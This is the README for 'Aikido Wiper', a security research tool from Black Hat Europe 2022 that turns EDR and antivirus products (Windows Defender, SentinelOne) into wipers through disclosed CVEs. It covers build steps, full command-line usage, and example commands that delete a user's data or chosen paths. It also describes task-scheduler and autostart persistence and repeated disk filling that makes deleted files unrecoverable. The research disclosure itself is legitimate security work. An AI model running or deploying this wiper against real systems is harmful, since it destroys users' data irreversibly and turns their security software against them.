# Aikido Wiper
Presented in Black Hat Europe 2022 Briefings under the title - [**Aikido: Turning EDRs to Malicious Wipers Using 0-day Exploits**](https://www.blackhat.com/eu-22/briefings/schedule/#aikido-turning-edrs-to-malicious-wipers-using--day-exploits-29336)

Full research process is described here - https://www.safebreach.com/resources/blog/safebreach-labs-researcher-discovers-multiple-zero-day-vulnerabilities/

## CVEs issued so far
* Windows Defender & Windows Defender for Endpoint - **CVE-2022-37971**
* TrendMicro Apex One - **CVE-2022-45797**
* Avast Antivirus & AVG Antivirus - **CVE-2022-4173**

The wiper is implemented only for the vulnerabilities found in the Windows Defender, Windows Defender for Endpoint and SentinelOne EDR.
## Installation
### Aikido Wiper Library
```bash
pip install <repo_path>
```
or
```bash
python setup.py install
```

### Aikido Wiper Tool
Make sure you installed the Aikido Wiper Library and then run:
```bash
pyinstaller --onefile wiper_tool/wiper.py
```

## General Description
Aikido Wiper is a next-gen wiper that manipulates EDRs and anti viruses in order to delete files.
## Usage
The Aikido Wiper offers two options to begin with:
```cmd
cmd> .\wiper.exe -h
usage: wiper.exe [-h] [-q] {PROXY_DELETION,ERASE_DISK_TRACES} ...

Aikido Wiper - Next gen wiping

optional arguments:
  -h, --help            show this help message and exit
  -q, --quiet           If specified, the wiper will run in the background

mode:
  {PROXY_DELETION,ERASE_DISK_TRACES}
```
* `PROXY_DELETION` - Specifies that you want to wipe something.
* `ERASE_DISK_TRACES` - Specifies that the wiper should fill the free space on the disk completely with a huge file, delete the file, and repeat this process a few times. This option mainly exists for the wiper to be able to use this feature in order to make deleted files unrestorable after one of the exploits is exploited and a reboot occurs.

If `PROXY_DELETION` is chosen then a few other options are available:
```cmd
cmd> .\wiper.exe PROXY_DELETION -h
usage: wiper.exe PROXY_DELETION [-h] [-p {MicrosoftDefenderDeleteProxy,SentinelOneDeleteProxy}]
                                [-etp {RIGHT_AFTER,TASK_SCHEDULER_REBOOT,AUTOSTART_REBOOT}]
                                [--decoy-root-dir DECOY_ROOT_DIR]
                                {ALL_USER_DATA,ALL_FILES_UNDER_PATH,CUSTOM_PATHS} ...

optional arguments:
  -h, --help            show this help message and exit
  -p {MicrosoftDefenderDeleteProxy,SentinelOneDeleteProxy}, --proxy {MicrosoftDefenderDeleteProxy,SentinelOneDeleteProxy}  
                        The proxy security control to use
  -etp {RIGHT_AFTER,TASK_SCHEDULER_REBOOT,AUTOSTART_REBOOT}, --erase-traces-point {RIGHT_AFTER,TASK_SCHEDULER_REBOOT,AUTOSTART_REBOOT}
                        When to execute the part of the wiping that fills the disk to remove traces of deleted files       
  --decoy-root-dir DECOY_ROOT_DIR
                        The path in which all the decoys will be placed in case of a usage of a JunctionSwitchProxy        

deletion_target:
  {ALL_USER_DATA,ALL_FILES_UNDER_PATH,CUSTOM_PATHS}
    ALL_USER_DATA       Try to delete the home directory of a certain user
    ALL_FILES_UNDER_PATH
                        Try to delete all the files under the certain path
    CUSTOM_PATHS        Try to delete custom paths
```
The mandatory option to choose is the deletion target.
* `ALL_USER_DATA` requires the name of the target user. example:
```cmd
cmd> .\wiper.exe PROXY_DELETION ALL_USER_DATA Admin
```
* `ALL_FILES_UNDER_PATH` requires the path to the target directory. example:
```cmd
cmd> .\wiper.exe PROXY_DELETION ALL_FILES_UNDER_PATH C:\Users\Admin
```
This option is not relevant to run against Windows Defender & Defender for Endpoint since the exploit for them does not support specific files deletion
* `CUSTOM_PATHS` requires a path to a file that contains a list separated by line breaks and contains the paths to try to delete. The paths can be directories or files. example:
```cmd
cmd> .\wiper.exe PROXY_DELETION CUSTOM_PATHS .\custom_paths.txt
```
The exploit for Windows Defender & Defender for Endpoint does not support specific files deletion. Therefore, the custom paths file can contain only paths to directories.

### Default Behavior With Mandatory Arguments Only
If you give the wiper only the mandatory arguments, which are the operation mode, probably `PROXY_DELETION`, along with the deletion target, then the default behavior will be as the following:
* The wiper will create a decoy directory in the root path of the Windows drive of the computer.
* The wiper will create the specially crafted paths inside the decoy directory and create the decoy files.
* The wiper will keep open handles to the decoy files until the EDR or the AV is forced to give up on deleting them and instead marks them for deletion for after the next reboot.
* The wiper will write a task to the task scheduler that will run the wiper in the `ERASE_DISK_TRACES` mode right after the reboot.
* After the reboot the target files or directories will be deleted and the wiper will start the process of filling up the disk a few times.

### Optional Behavior With Optional Arguments
#### `-p` / `--proxy`
Lets you choose the deletion proxy class to use. By default, the class is chosen according to the EDR / AV installed on the computer.
* `MicrosoftDefenderDeleteProxy` - Exploits CVE-2022-37971.
* `SentinelOneDeleteProxy` - Exploits <TBD>
#### `-etp` / `--erase-traces-point`
Lets you choose the point in time in which the erase disk traces trick should occur. In other words, the point in time when the wiper starts to fill up the disk to no space for a few times.
* `RIGHT_AFTER` - Should occur right after the exploit is being exploited with no reboot (not relevant for `MicrosoftDefenderDeleteProxy` or `SentinelOneDeleteProxy` but maybe for future exploits)
* `TASK_SCHEDULER_REBOOT` - The wiper should erase disk traces after reboot while using the task scheduler persistency method.
* `AUTOSTART_REBOOT` - The wiper should erase disk traces after reboot while using the autostart directory persistency method.
#### `--decoy-root-dir`
The exploits require a creation of decoy malicious files in order to make the AV / EDR try to delete them and then right before the deletion turn the decoys' root directory into a junction point to the Windows drive. This parameter lets you choose where to create the root directory for the decoys which are used for the exploits against the EDRs / AVs. The default directory is a directory with a uuid name in the Windows drive.



